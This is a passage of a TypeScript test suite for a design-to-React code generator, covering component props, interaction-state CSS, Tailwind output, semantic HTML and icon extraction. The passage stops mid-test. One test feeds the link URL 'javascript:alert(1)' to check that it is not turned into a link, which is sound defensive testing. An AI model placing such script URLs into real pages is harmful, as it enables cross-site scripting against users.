import {test} from 'node:test';
import assert from 'node:assert/strict';
import {createDocument, defaultAutoLayout, defaultTextProps, solid} from '../shared/design/defaults';
import type {DesignDocument, SceneNode} from '../shared/design/types';
import {combineAsVariants} from '../shared/design/variants';
import {addComponentProperty, bindProperty, createInstance} from '../shared/design/components';
import {toReact, type ReactResult} from '../shared/design/codegen/react';
import {componentModel, propType} from '../shared/design/codegen/model';
import {NameRegistry} from '../shared/design/codegen/names';
import {PRODUCT_NAME} from '../shared/design/product';
import {templateById, type TemplateId} from '../shared/design/templates';
import ts from 'typescript';
import {add, buttonFile, measurer, showcaseFile, update} from './design-codegen-fixture';

// Design → React as a front-end team writes it: components over their native element's props, variants as
// props keyed by data attributes, interaction states as CSS, a label as children, instances as usages, semantic
// tags, icons in src/icons, repeated items as typed data and .map(). The button set is pinned as a snapshot:
// what a developer gets for a real component. tests/design-codegen-build.test.ts compiles and renders whole projects.

const file = (result: ReactResult, path: string) => {
  const found = result.files.find(f => f.path === path);
  assert.ok(found, `${path} in ${result.files.map(f => f.path).join(', ')}`);
  return found.contents;
};

const BUTTON_TSX = `// "Button" from ${PRODUCT_NAME}.
import {type ComponentPropsWithRef, type ReactNode} from 'react';
import {IconArrow} from './IconArrow';
import {cx} from '../lib/cx';
import styles from './Button.module.css';

export type ButtonProps = ComponentPropsWithRef<'button'> & {
  /** "Size" */
  size?: 'large' | 'small';
  /** "Glyph": shown when set */
  glyph?: ReactNode;
};

export function Button({size = 'large', glyph = <IconArrow />, children, className, ...props}: ButtonProps) {
  return (
    <button type="button" className={cx(styles.root, className)} data-size={size} {...props}>
      {glyph && <span className={styles.glyph}>{glyph}</span>}
      <span className={styles.label}>{children}</span>
    </button>
  );
}
`;

const BUTTON_CSS = `.root {
  border: 0;
  font: inherit;
  color: inherit;
  display: inline-flex;
  justify-content: center;
  align-items: center;
  gap: 8px;
  padding: 12px 24px;
  background: #0D99FF;
  border-radius: 8px;
  cursor: pointer;
}

.root[data-size='small'] {
  padding: 8px 16px;
}

.root:hover {
  background: #007BE5;
}

.glyph {
  width: 24px;
  height: 24px;
  flex-shrink: 0;
  display: flex;
  justify-content: center;
  align-items: center;
}

.root[data-size='small'] .glyph {
  width: 16px;
  height: 16px;
}

.label {
  font-family: 'Inter', sans-serif;
  font-weight: 600;
  font-size: 16px;
  line-height: 24px;
  color: #FFFFFF;
  white-space: nowrap;
}

.root[data-size='small'] .label {
  font-size: 14px;
  line-height: 20px;
}
`;

test('snapshot: a button set with sizes, a hover state, an icon swap shown by a toggle, and a label', () => {
  const {doc} = buttonFile();
  const result = toReact(doc, ['btn'], {measurer});
  assert.equal(file(result, 'src/components/Button.tsx'), BUTTON_TSX);
  assert.equal(file(result, 'src/components/Button.module.css'), BUTTON_CSS);
  assert.deepEqual(result.entries.map(entry => entry.name), ['Button']);
  assert.deepEqual(result.components.map(info => info.name), ['Button', 'IconArrow'], 'the default icon comes along');
  assert.deepEqual(result.entries[0].examples, ['<Button>Buy</Button>', '<Button size="small">Buy</Button>'], 'one example per look; hover is the browser\'s');
  assert.deepEqual(result.entries[0].states, ['hover']);
  assert.equal(result.entries[0].element, 'button');
});

test('component properties become typed props; the label is children, the icon toggle merges into the icon', () => {
  const {doc} = buttonFile();
  const model = componentModel(doc, 'btn', new NameRegistry());
  const props = Object.fromEntries(model.props.map(prop => [prop.jsName, propType(prop)]));
  assert.deepEqual(props, {size: "'large' | 'small'", state: "'normal' | 'hover'", children: 'ReactNode', showIcon: 'boolean', glyph: 'ReactNode'});
  assert.deepEqual(model.variantProps.map(prop => prop.options.map(option => [option.value, option.id])), [[['Large', 'large'], ['Small', 'small']], [['Normal', 'normal'], ['Hover', 'hover']]]);
  assert.equal(model.button, true, '"Button" renders a <button>');
  assert.equal(model.rootKind, 'button');
  assert.deepEqual([...model.state!.of], [['normal', 'rest'], ['hover', 'hover']], '"State" is an interaction state');
  assert.equal(model.props.find(prop => prop.jsName === 'showIcon')!.mergedInto, 'glyph');
  const info = toReact(doc, ['btn'], {measurer}).entries[0];
  assert.deepEqual(info.props.map(prop => [prop.name, prop.defaultValue, prop.native]), [['size', "'large'", false], ['children', null, true], ['glyph', '<IconArrow />', false]]);
});

/** A button set: "Kind" primary / secondary × "State" default / hover / pressed / focus / disabled, and a label. */
function stateFile(): DesignDocument {
  let doc = createDocument('p');
  const look = {primary: {base: 0.2, hover: 0.1}, secondary: {base: 0.9, hover: 0.8}} as const;
  const ids: string[] = [];
  for (const kind of ['primary', 'secondary'] as const) {
    for (const state of ['Default', 'Hover', 'Pressed', 'Focused', 'Disabled'] as const) {
      const id = `${kind}-${state}`;
      ids.push(id);
      const grey = state === 'Disabled' ? 0.85 : state === 'Hover' || state === 'Pressed' ? look[kind].hover : look[kind].base;
      doc = add(doc, 'COMPONENT', {id, parentId: 'p', name: `Kind=${kind === 'primary' ? 'Primary' : 'Secondary'}, State=${state}`, x: ids.length * 120, width: 100, height: 40,
        fills: [solid({r: grey, g: grey, b: grey})], cornerRadius: 8, layoutSizingHorizontal: 'HUG', layoutSizingVertical: 'HUG',
        effects: state === 'Focused' ? [{type: 'DROP_SHADOW', color: {r: 0, g: 0.4, b: 1, a: 1}, offset: {x: 0, y: 0}, radius: 0, spread: 3, visible: true, blendMode: 'NORMAL'}] : [],
        autoLayout: {...defaultAutoLayout('HORIZONTAL'), paddingLeft: 16, paddingRight: 16, paddingTop: 10, paddingBottom: 10}});
      doc = add(doc, 'TEXT', {id: `${id}-t`, parentId: id, name: 'Label', fills: [solid(state === 'Disabled' ? {r: 0.5, g: 0.5, b: 0.5} : {r: 1, g: 1, b: 1})], text: defaultTextProps('Save')});
    }
  }
  doc = combineAsVariants(doc, ids, 'set').doc;
  return update(doc, 'set', {name: 'Button'});
}

test('interaction states are CSS, never props: :hover, :active, :focus-visible and :disabled of the look they belong to', () => {
  const result = toReact(stateFile(), ['set'], {measurer});
  const tsx = file(result, 'src/components/Button.tsx');
  const css = file(result, 'src/components/Button.module.css');
  assert.match(tsx, /export type ButtonProps = ComponentPropsWithRef<'button'> & \{\n  \/\*\* "Kind" \*\/\n  kind\?: 'primary' \| 'secondary';\n\};/);
  assert.doesNotMatch(tsx, /state|hover|pressed|focused/i, 'no state prop: the browser keeps those states');
  assert.match(tsx, /<button type="button" className=\{cx\(styles\.root, className\)\} data-kind=\{kind\} \{\.\.\.props\}>/, 'disabled reaches the native button through props');
  // Hover follows the kind; disabled is one look for both kinds; hover never paints over a disabled button.
  assert.match(css, /\.root\[data-kind='primary'\]:hover:not\(:disabled\) \{\n  background: #1A1A1A;\n\}/);
  assert.match(css, /\.root\[data-kind='secondary'\]:hover:not\(:disabled\) \{\n  background: #CCCCCC;\n\}/);
  assert.match(css, /\.root\[data-kind='primary'\]:active:not\(:disabled\) \{/);
  assert.match(css, /\.root:focus-visible \{\n  box-shadow: 0 0 0 3px #0066FF;\n\}/);
  assert.match(css, /\.root:disabled \{\n  background: #D9D9D9;\n  cursor: not-allowed;\n\}/, 'a disabled button does not offer the pointer');
  assert.match(css, /\.root:disabled \.label \{\n  color: #808080;\n\}/, 'a state reaches into the children');
  const order = ['.root:focus-visible', ":active:not(:disabled)", '.root:disabled {'].map(selector => css.indexOf(selector));
  assert.ok(order.every((at, i) => at > 0 && (i === 0 || at > order[i - 1])), 'states in the browser\'s order, disabled last');
  assert.deepEqual(result.entries[0].examples, ['<Button>Save</Button>', '<Button kind="secondary">Save</Button>', '<Button disabled>Save</Button>']);
  // Tailwind: the same states as variants, the children through the root's group (named, so a component inside another
  // follows its own root). A background the kind changes is in each kind's entry only: two bg-* on one element would win by
  // Tailwind's stylesheet order, not the class list.
  const tw = file(toReact(stateFile(), ['set'], {styling: 'tailwind', measurer}), 'src/components/Button.tsx');
  assert.match(tw, /const rootKind = \{primary: 'bg-\[#333333\] enabled:hover:bg-\[#1A1A1A\] enabled:active:bg-\[#1A1A1A\]', secondary: 'bg-\[#E6E6E6\] enabled:hover:bg-\[#CCCCCC\] enabled:active:bg-\[#CCCCCC\]'\};/);
  assert.doesNotMatch(tw, /cx\('(?:[^']*\s)?bg-/, 'no plain background in the base classes');
  assert.match(tw, /'group\/button [^']*focus-visible:/);
  assert.match(tw, /group-disabled\/button:text-\[#808080\]/);
});

test('a state property with a look of its own keeps it as a prop: error beside hover and disabled', () => {
  let doc = createDocument('p');
  const ids = ['Default', 'Hover', 'Error', 'Disabled'].map((state, i) => {
    doc = add(doc, 'COMPONENT', {id: `c${i}`, parentId: 'p', name: `State=${state}`, x: i * 120, width: 100, height: 40, fills: [solid({r: 1, g: 1, b: 1})],
      strokes: [solid(state === 'Error' ? {r: 1, g: 0, b: 0} : state === 'Hover' ? {r: 0, g: 0, b: 1} : {r: 0.8, g: 0.8, b: 0.8})], opacity: state === 'Disabled' ? 0.5 : 1});
    return `c${i}`;
  });
  doc = update(combineAsVariants(doc, ids, 'set').doc, 'set', {name: 'Panel'});
  const result = toReact(doc, ['set'], {measurer});
  const tsx = file(result, 'src/components/Panel.tsx');
  assert.match(tsx, /\/\*\* "State: Error": true — "Error", false — "Default" \*\/\n  error\?: boolean;/);
  assert.match(tsx, /\/\*\* Disabled: `aria-disabled` and the look of the disabled state\. \*\/\n  disabled\?: boolean;/, 'a div root says it is disabled with aria-disabled');
  assert.match(tsx, /data-error=\{error \|\| undefined\} aria-disabled=\{disabled \|\| undefined\} \{\.\.\.props\}/);
  const css = file(result, 'src/components/Panel.module.css');
  assert.match(css, /\.root\[data-error\] \{\n  box-shadow: inset 0 0 0 1px #FF0000;\n\}/);
  assert.match(css, /\.root:hover:not\(\[aria-disabled='true'\]\) \{/);
  assert.match(css, /\.root\[aria-disabled='true'\] \{\n  opacity: 0\.5;\n\}/);
  // "Code" names each state by the selector the stylesheet uses on this root.
  assert.deepEqual(result.entries[0].stateSelectors, {hover: ':hover', disabled: "[aria-disabled='true']"});
});

test('a switch is a button with role="switch" and aria-checked; its on look is keyed on aria-checked', () => {
  // Russian layer and property names on purpose: the generator reads Russian yes/no pairs ("Да"/"Нет") and
  // component names ("Переключатель" is a switch), so this checks the Russian vocabulary of the codegen.
  let doc = createDocument('p');
  doc = add(doc, 'COMPONENT', {id: 'on', parentId: 'p', name: 'Активный=Да', width: 40, height: 20, fills: [solid({r: 0, g: 0.8, b: 0})]});
  doc = add(doc, 'COMPONENT', {id: 'off', parentId: 'p', name: 'Активный=Нет', x: 60, width: 40, height: 20, fills: [solid({r: 0.8, g: 0.8, b: 0.8})]});
  doc = combineAsVariants(doc, ['on', 'off'], 'set').doc;
  doc = update(doc, 'set', {name: 'Переключатель'});
  const result = toReact(doc, ['set'], {measurer});
  const tsx = file(result, 'src/components/Switch.tsx');
  assert.match(tsx, /\/\*\* "Активный": true — "Да", false — "Нет" \*\/\n  checked\?: boolean;/);
  assert.match(tsx, /export function Switch\(\{checked = true, className, \.\.\.props\}: SwitchProps\)/);
  assert.match(tsx, /<button type="button" role="switch" aria-checked=\{checked\} className=\{cx\(styles\.root, className\)\} \{\.\.\.props\} \/>/);
  assert.match(file(result, 'src/components/Switch.module.css'), /\.root\[aria-checked='false'\] \{\n  background: #CCCCCC;\n\}/);
  // A yes/no property of anything else is a boolean prop keyed on a data attribute.
  const chip = update(doc, 'set', {name: 'Чип'});
  const plain = toReact(chip, ['set'], {measurer});
  assert.match(file(plain, 'src/components/Chip.tsx'), /active\?: boolean;[\s\S]*data-active=\{active \|\| undefined\}/);
  assert.match(file(plain, 'src/components/Chip.module.css'), /\.root:not\(\[data-active\]\) \{\n  background: #CCCCCC;\n\}/);
});

test('instances become usages: variant, text, toggle and swap overrides as props, the label as children', () => {
  const {doc} = buttonFile();
  const tsx = file(toReact(doc, ['home'], {measurer}), 'src/screens/Home.tsx');
  assert.match(tsx, /import \{Button, type ButtonProps\} from '\.\.\/components\/Button';/);
  assert.match(tsx, /import \{IconPlus\} from '\.\.\/components\/IconPlus';/);
  // Three buttons in a column differ only in props: typed data and one usage.
  assert.match(tsx, /type ButtonItem = \{label: string; size\?: ButtonProps\['size'\]; glyph\?: ButtonProps\['glyph'\]\};/);
  assert.match(tsx, /\{label: 'Buy'\},\n  \{label: 'Learn more', size: 'small', glyph: <IconPlus \/>\},\n  \{label: 'Buy', glyph: null\},/, 'a hidden icon with a default is null');
  assert.match(tsx, /<Button key=\{index\} size=\{button\.size\} glyph=\{button\.glyph\}>\{button\.label\}<\/Button>/, 'labels repeat, so the key is the position');
  assert.match(tsx, /<h1 className=\{styles\.heading\}>Beans<\/h1>/, 'the screen\'s one heading is its h1');
  const entry = toReact(doc, ['b2'], {measurer}).entries[0];
  assert.equal(entry.name, 'Button');
  assert.equal(entry.usage, '<Button size="small" glyph={<IconPlus />}>Learn more</Button>');
});

test('an override no prop carries is said in the notes, never as a comment in the code', () => {
  let {doc} = buttonFile();
  doc = update(doc, 'b1;lg-label', {fills: [solid({r: 1, g: 0, b: 0})], overrides: ['fills']});
  const result = toReact(doc, ['home'], {measurer});
  assert.doesNotMatch(file(result, 'src/screens/Home.tsx'), /\{\/\*/);
  assert.ok(result.warnings.some(warning => warning.includes('"Label": fill')), result.warnings.join('\n'));
});

test('Tailwind: the scale, variant maps, hover as a variant, the theme\'s tokens, nothing preflight does', () => {
  const {doc} = buttonFile();
  const tsx = file(toReact(doc, ['btn'], {styling: 'tailwind', measurer}), 'src/components/Button.tsx');
  // What the size changes is in each size's entry, the default's too, and not in the base (px-6 beside px-4 would be px-6).
  assert.match(tsx, /const rootSize = \{large: 'px-6 py-3', small: 'px-4 py-2'\};/);
  assert.match(tsx, /className=\{cx\('inline-flex justify-center items-center gap-2 bg-\[#0D99FF\] rounded-lg cursor-pointer hover:bg-\[#007BE5\]', rootSize\[size\], className\)\}/);
  assert.match(tsx, /<span className=\{cx\('font-semibold text-\[#FFFFFF\] whitespace-nowrap', labelSize\[size\]\)\}>\{children\}<\/span>/, 'the base family is the theme\'s sans');
  assert.match(tsx, /const labelSize = \{large: 'text-\[16px\] leading-\[24px\]', small: 'text-\[14px\] leading-\[20px\]'\};/);
  assert.doesNotMatch(tsx, /module\.css|border-0|\[font:inherit\]|text-inherit|m-0|box-border|flex-none/);
  const card = toReact(showcaseFile(), ['card'], {styling: 'tailwind', measurer});
  assert.match(file(card, 'src/screens/ProductCard.tsx'), /bg-surface-card rounded-2xl shadow-card/);
  assert.match(file(card, 'src/theme.css'), /--color-surface-card: #FFFFFF;/);
});

test('inline styles: one typed styles object, variant modifiers spread in; hover cannot be inline and says so', () => {
  const {doc} = buttonFile();
  const result = toReact(doc, ['btn'], {styling: 'inline', measurer});
  const tsx = file(result, 'src/components/Button.tsx');
  assert.match(tsx, /import \{type CSSProperties, type ComponentPropsWithRef, type ReactNode\} from 'react';/);
  assert.match(tsx, /root: \{border: 0, font: 'inherit', color: 'inherit', display: 'inline-flex', justifyContent: 'center', alignItems: 'center', gap: 8, padding: '12px 24px', background: '#0D99FF', borderRadius: 8, cursor: 'pointer'\},/);
  assert.match(tsx, /label: \{fontFamily: "'Inter', sans-serif", /, 'a font stack keeps its quotes readable');
  assert.match(tsx, /\} satisfies Record<string, CSSProperties>;/);
  assert.match(tsx, /style=\{\{\.\.\.styles\.root, \.\.\.\(size === 'small' \? styles\.rootSizeSmall : undefined\), \.\.\.style\}\}/);
  assert.ok(!result.files.some(f => f.path.endsWith('.css')));
  assert.ok(result.warnings.some(warning => warning.includes(':hover')), 'the lost hover is said');
});

test('semantic tags: the heading outline, paragraphs and labels, links with noopener, pictures with alt, lists', () => {
  let doc: DesignDocument = createDocument('p');
  doc.images.img = {url: '/uploads/dz-1.webp', width: 600, height: 400, name: 'Bean photo'};
  doc = add(doc, 'FRAME', {id: 'f', parentId: 'p', name: 'Page', width: 400, height: 600, autoLayout: {...defaultAutoLayout('VERTICAL'), itemSpacing: 8}});
  doc = add(doc, 'TEXT', {id: 'h2', parentId: 'f', name: 'Subheading', text: {...defaultTextProps('Blends'), style: {...defaultTextProps().style, fontSize: 24, fontWeight: 600}}});
  doc = add(doc, 'TEXT', {id: 'p1', parentId: 'f', name: 'Text', width: 380, text: {...defaultTextProps('Site: zerno.ru, email'), textAutoResize: 'HEIGHT', runs: [
    {start: 6, end: 14, style: {hyperlink: {type: 'URL', url: 'https://zerno.ru'}}},
    {start: 16, end: 21, style: {hyperlink: {type: 'URL', url: 'javascript:alert(1)'}}},
  ]}});
  doc = add(doc, 'TEXT', {id: 'list', parentId: 'f', name: 'List', text: {...defaultTextProps('Blend\nArabica\nRobusta'), listTypes: ['NONE', 'UNORDERED', 'UNORDERED']}});
  doc = add(doc, 'RECTANGLE', {id: 'photo', parentId: 'f', name: 'Bean photo', width: 400, height: 200, fills: [{type: 'IMAGE', imageRef: 'img', scaleMode: 'FIT', opacity: 1, visible: true, blendMode: 'NORMAL'}]});
  doc = add(doc, 'RECTANGLE', {id: 'deco', parentId: 'f', name: 'Rectangle 4', width: 400, height: 20, fills: [{type: 'IMAGE', imageRef: 'img', scaleMode: 'FILL', opacity: 1, visible: true, blendMode: 'NORMAL'}]});
  doc = add(doc, 'FRAME', {id: 'cta', parentId: 'f', name: 'Buy', width: 120, height: 40, reactions: [{trigger: {type: 'ON_CLICK'}, actions: [{type: 'URL', url: 'https://zerno.ru/buy', openInNewTab: true}]}]});
  doc = add(doc, 'TEXT', {id: 'cta-t', parentId: 'cta', name: 'Buy', x: 10, y: 10, text: defaultTextProps('Buy')});
  const result = toReact(doc, ['f'], {measurer});
  const tsx = file(result, 'src/screens/Page.tsx');
  assert.match(tsx, /<h1 className=\{styles\.subheading\}>Blends<\/h1>/, 'the only heading of a screen is its h1, whatever its size');
  assert.match(tsx, /<p className=\{styles\.text\}>Site: <a href="https:\/\/zerno\.ru" target="_blank" rel="noopener noreferrer" className=\{styles\.textLink\}>zerno\.ru<\/a>, email<\/p>/, 'only http(s) and mailto become links; a wrapping text is a paragraph');
  assert.match(file(result, 'src/screens/Page.module.css'), /\.textLink \{\n  color: inherit;\n\}/, 'a link keeps the text colour');
  assert.match(tsx, /<div className=\{styles\.list\}>\n\s+Blend\n\s+<ul className=\{styles\.listList\}>\n\s+<li>Arabica<\/li>\n\s+<li>Robusta<\/li>\n\s+<\/ul>/);
  assert.match(tsx, /import beanPhotoSrc from '\.\.\/assets\/bean-photo\.webp';/);
  assert.match(tsx, /<img className=\{styles\.beanPhoto\} src=\{beanPhotoSrc\} alt="Bean photo" \/>/);
  assert.match(tsx, /<img className=\{styles\.image\} src=\{beanPhotoSrc\} alt="" \/>/, 'a picture named only by its kind is decoration');
  assert.match(tsx, /<a href="https:\/\/zerno\.ru\/buy" target="_blank" rel="noopener noreferrer" className=\{styles\.buy\}><span className=\{styles\.buyLabel\}>Buy<\/span><\/a>/, 'text inside a link is a span, its label');
  assert.match(file(result, 'src/screens/Page.module.css'), /\.beanPhoto \{[^}]*object-fit: contain;/);
  assert.deepEqual(result.assets, [{path: 'src/assets/bean-photo.webp', ref: 'img', url: '/uploads/dz-1.webp'}]);
});

test('a screen\'s outline starts at h1 and never skips; numbers and initials are never headings', () => {
  let doc: DesignDocument = createDocument('p');
  doc.styles = {h1: {id: 'h1', type: 'TEXT', name: 'Heading/H1', description: '', text: {...defaultTextProps().style, fontSize: 32, fontWeight: 700}}};
  doc = add(doc, 'FRAME', {id: 's', parentId: 'p', name: 'Profile', width: 393, height: 852, autoLayout: {...defaultAutoLayout('VERTICAL'), itemSpacing: 8}});
  const big = (id: string, characters: string, fontSize: number, extra: Pick<Partial<SceneNode>, 'textStyleId'> = {}) => {
    doc = add(doc, 'TEXT', {id, parentId: 's', name: characters, text: {...defaultTextProps(characters), style: {...defaultTextProps().style, fontSize, fontWeight: 600}}, ...extra});
  };
  big('title', 'Profile', 32, {textStyleId: 'h1'});
  big('initials', 'AS', 35);
  big('count', '128', 24);
  big('name', 'Anna Smith', 22);
  big('section', 'Account settings', 20);
  const tsx = file(toReact(doc, ['s'], {measurer}), 'src/screens/Profile.tsx');
  assert.match(tsx, /<h1 className=\{styles\.title\}>Profile<\/h1>/);
  assert.match(tsx, /<span className=\{styles\.text\}>AS<\/span>/);
  assert.match(tsx, /<span className=\{styles\.text2\}>128<\/span>/);
  assert.match(tsx, /<h2 className=\{styles\.title2\}>Anna Smith<\/h2>/);
  assert.match(tsx, /<h3 className=\{styles\.title3\}>Account settings<\/h3>/);
  assert.match(tsx, /^    <main className=\{styles\.root\}>/m, 'a page-shaped frame is the page\'s main');
  const css = file(toReact(doc, ['s'], {measurer}), 'src/screens/Profile.module.css');
  assert.match(css, /\.root \{[^}]*width: 100%;\n  max-width: 393px;\n  margin-inline: auto;\n  min-height: 100dvh;/, 'it takes the viewport, up to the design\'s width');
});

test('vectors become icon components in src/icons; one-colour icons draw with currentColor', () => {
  let doc = createDocument('p');
  doc = add(doc, 'FRAME', {id: 'f', parentId: 'p', name: 'Header', width: 200, height: 40, fills: []});
  doc = add(doc, 'TEXT', {id: 't', parentId: 'f', name: 'Logo', x: 72, y: 8, text: defaultTextProps('Beans')});
  doc = add(doc, 'STAR', {id: 's', parentId: 'f', name: 'Star', x: 8, y: 8, width: 24, height: 24, fills: [solid({r: 1, g: 0.6, b: 0})]});
  doc = add(doc, 'STAR', {id: 's2', parentId: 'f', name: 'Star', x: 40, y: 8, width: 24, height: 24, fills: [solid({r: 1, g: 0.6, b: 0})]});
  const result = toReact(doc, ['f'], {measurer});
  const tsx = file(result, 'src/screens/Header.tsx');
  assert.match(tsx, /import \{StarIcon\} from '\.\.\/icons\/StarIcon';/);
  const icon = file(result, 'src/icons/StarIcon.tsx');
  assert.match(icon, /^import type \{SVGProps\} from 'react';\n\nexport function StarIcon\(props: SVGProps<SVGSVGElement>\) \{\n  return \(\n    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" overflow="visible" aria-hidden="true" \{\.\.\.props\}>\n      <path d="M12 0L/);
  assert.match(icon, /fill="currentColor"/);
  assert.equal(result.files.filter(f => f.path.startsWith('src/icons/')).length, 1, 'identical pictures share one icon');
  // "Star" is a star's default name: the class says its role.
  assert.match(tsx, /<StarIcon className=\{styles\.icon\} \/>\n\s+<StarIcon className=\{styles\.icon2\} \/>/, 'placed apart, each keeps its class');
  assert.match(file(result, 'src/screens/Header.module.css'), /\.icon \{\n  position: absolute;\n  left: 8px;\n  top: 8px;\n  width: 24px;\n  height: 24px;\n  color: #FF9900;\n\}/);
  // A frame holding only vectors is one picture, named after the layer; gradients keep their ids apart.
  let logoDoc = createDocument('p');
  logoDoc = add(logoDoc, 'FRAME', {id: 'logo', parentId: 'p', name: 'Logo', width: 48, height: 48, fills: []});
  logoDoc = add(logoDoc, 'ELLIPSE', {id: 'ring', parentId: 'logo', name: 'Ring', width: 48, height: 48, arcData: {startingAngle: 0, endingAngle: Math.PI * 2, innerRadius: 0.6},
    fills: [{type: 'GRADIENT_LINEAR', gradientHandlePositions: [{x: 0, y: 0}, {x: 1, y: 1}, {x: 1, y: 0}], gradientStops: [{position: 0, color: {r: 1, g: 0, b: 0, a: 1}}, {position: 1, color: {r: 0, g: 0, b: 1, a: 1}}], opacity: 1, visible: true, blendMode: 'NORMAL'}]});
  const logo = toReact(logoDoc, ['logo'], {measurer});
  const logoIcon = file(logo, 'src/icons/Logo.tsx');
  assert.match(logoIcon, /export function Logo\(props: SVGProps<SVGSVGElement>\)/);
  assert.match(logoIcon, /<linearGradient id="logo-[a-z0-9_]+"/);
  assert.match(logoIcon, /fill="url\(#logo-[a-z0-9_]+\)"/);
  assert.doesNotMatch(logoIcon, /dzsvgid|\\u0000/);
});

test('frames that picked a variable mode carry its attribute; tokens follow', () => {
  let doc = createDocument('p');
  doc.variableCollections.c = {id: 'c', name: 'Theme', modes: [{modeId: 'l', name: 'Light'}, {modeId: 'd', name: 'Dark'}], defaultModeId: 'l', variableIds: ['bg']};
  doc.variables.bg = {id: 'bg', name: 'Background', collectionId: 'c', type: 'COLOR', valuesByMode: {l: {r: 1, g: 1, b: 1, a: 1}, d: {r: 0, g: 0, b: 0, a: 1}}, description: ''};
  doc.variableModes = {f: {c: 'd'}};
  doc = add(doc, 'FRAME', {id: 'f', parentId: 'p', name: 'Card', width: 100, height: 100, fills: [{...solid({r: 0, g: 0, b: 0}), boundVariables: {color: {type: 'VARIABLE_ALIAS', id: 'bg'}}}]});
  const result = toReact(doc, ['f'], {measurer});
  assert.match(file(result, 'src/screens/Card.tsx'), /<div className=\{styles\.root\} data-theme="dark" \/>/);
  assert.match(file(result, 'src/screens/Card.module.css'), /background: var\(--color-background\);/);
  assert.match(file(result, 'src/tokens.css'), /\[data-theme='dark'\] \{\n  --color-background: #000000;\n\}/);
});

test('generation is deterministic and names never collide', () => {
  const {doc} = buttonFile();
  const a = toReact(doc, ['p'], {measurer});
  const b = toReact(doc, ['p'], {measurer});
  assert.deepEqual(a.files, b.files);
  const paths = a.files.map(f => f.path.toLowerCase());
  assert.equal(new Set(paths).size, paths.length);
  // Two layers with the same name become two components with distinct names.
  let twins = createDocument('p');
  twins = add(twins, 'COMPONENT', {id: 'a', parentId: 'p', name: 'Button', width: 10, height: 10});
  twins = add(twins, 'COMPONENT', {id: 'b', parentId: 'p', name: 'Button', x: 20, width: 10, height: 10});
  twins = createInstance(twins, 'b', {parentId: 'p', newId: 'i'}).doc;
  assert.deepEqual(toReact(twins, ['a', 'b'], {measurer}).entries.map(entry => entry.name), ['Button', 'Button2']);
});

test('every kind of layer generates code that parses, in every styling', () => {
  let doc = showcaseFile();
  doc = add(doc, 'FRAME', {id: 'zoo', parentId: 'p', name: 'Zoo', x: 1000, y: 0, width: 600, height: 600, fills: [solid({r: 1, g: 1, b: 1})]});
  doc = add(doc, 'GROUP', {id: 'g', parentId: 'zoo', name: 'Group', x: 10, y: 10, width: 100, height: 100});
  doc = add(doc, 'RECTANGLE', {id: 'g-r', parentId: 'g', name: 'Rectangle', width: 100, height: 100, rotation: 30, flipX: true});
  doc = add(doc, 'LINE', {id: 'line', parentId: 'zoo', name: 'Arrow', x: 10, y: 200, width: 120, height: 0, strokes: [solid({r: 0, g: 0, b: 0})], strokeEndMarker: 'TRIANGLE_ARROW'});
  doc = add(doc, 'LINE', {id: 'rule', parentId: 'zoo', name: 'Line', x: 10, y: 220, width: 120, height: 0, strokes: [solid({r: 0, g: 0, b: 0})], dashPattern: [4, 4]});
  doc = add(doc, 'ELLIPSE', {id: 'arc', parentId: 'zoo', name: 'Arc', x: 200, y: 10, width: 60, height: 60, arcData: {startingAngle: 0, endingAngle: Math.PI, innerRadius: 0.5}, rotation: 45});
  doc = add(doc, 'POLYGON', {id: 'poly', parentId: 'zoo', name: 'Polygon', x: 280, y: 10, width: 40, height: 40, constraints: {horizontal: 'SCALE', vertical: 'CENTER'}});
  doc = add(doc, 'RECTANGLE', {id: 'mask', parentId: 'zoo', name: 'Cutout', x: 0, y: 0, width: 50, height: 50, isMask: true});
  doc = add(doc, 'RECTANGLE', {id: 'hidden', parentId: 'zoo', name: 'Hidden', visible: false});
  doc = add(doc, 'SECTION', {id: 'sec', parentId: 'p', name: 'Section', x: 0, y: 1200, width: 300, height: 200});
  doc = add(doc, 'TEXT', {id: 'weird', parentId: 'sec', name: 'Odd text', text: {...defaultTextProps('a {b} <c> & "d" `e` ${f}\n\ng\\h'), style: {...defaultTextProps().style, textCase: 'TITLE'}}});
  doc = add(doc, 'TEXT', {id: 'numbered', parentId: 'sec', name: '1. Steps', text: {...defaultTextProps('One\nTwo'), listTypes: ['ORDERED', 'ORDERED']}});
  doc = add(doc, 'INSTANCE', {id: 'orphan', parentId: 'sec', name: 'Lost instance', componentId: 'missing', width: 40, height: 40});
  doc = add(doc, 'SLICE', {id: 'slice', parentId: 'sec', name: 'Slice'});
  const ids = Object.keys(doc.nodes);
  for (const styling of ['css-modules', 'tailwind', 'inline'] as const) {
    for (const id of ids) {
      for (const generated of toReact(doc, [id], {styling, measurer}).files) {
        if (!/\.tsx?$/.test(generated.path)) continue;
        const out = ts.transpileModule(generated.contents, {reportDiagnostics: true, compilerOptions: {jsx: ts.JsxEmit.ReactJSX, target: ts.ScriptTarget.ES2022, module: ts.ModuleKind.ESNext}});
        assert.deepEqual(out.diagnostics?.map(d => ts.flattenDiagnosticMessageText(d.messageText, '\n')), [], `${styling} ${id} ${generated.path}:\n${generated.contents}`);
        assert.doesNotMatch(generated.contents, /\u0000|dzsvgid/, `${id}: no placeholders left`);
      }
    }
  }
  const weird = file(toReact(doc, ['weird'], {measurer}), 'src/screens/OddText.tsx');
  assert.match(weird, /\{"a \{b\} <c> & \\"d\\" `e` \$\{f\}"\}<br \/><br \/>g\\h/);
  assert.ok(toReact(doc, ['zoo'], {measurer}).warnings.some(warning => warning.includes('Mask "Cutout"')));
});

test('variant values that start with a digit or are decimal or negative numbers still make valid code', () => {
  // "1 month" became the key `1Month` of a lookup object, "0.5" the name `rootStep0.5`: both broke the exported file.
  const set = (prop: string, values: string[]) => {
    let doc = createDocument('p');
    values.forEach((value, i) => {
      doc = add(doc, 'COMPONENT', {id: 'c' + i, parentId: 'p', name: `${prop}=${value}`, x: i * 200, width: 120 + i * 10, height: 40, opacity: 1 - i * 0.2, fills: [solid({r: i === 0 ? 1 : 0, g: i === 1 ? 1 : 0, b: i === 2 ? 1 : 0})]});
      doc = add(doc, 'TEXT', {id: 't' + i, parentId: 'c' + i, name: 'Price', text: defaultTextProps(['$100', '$500', '$900'][i]!)});
    });
    return combineAsVariants(doc, values.map((_, i) => 'c' + i), 'set').doc;
  };
  for (const doc of [set('Period', ['1 month', '6 months', '12 months']), set('Step', ['0.5', '1', '-1'])])
    for (const styling of ['css-modules', 'tailwind', 'inline'] as const) {
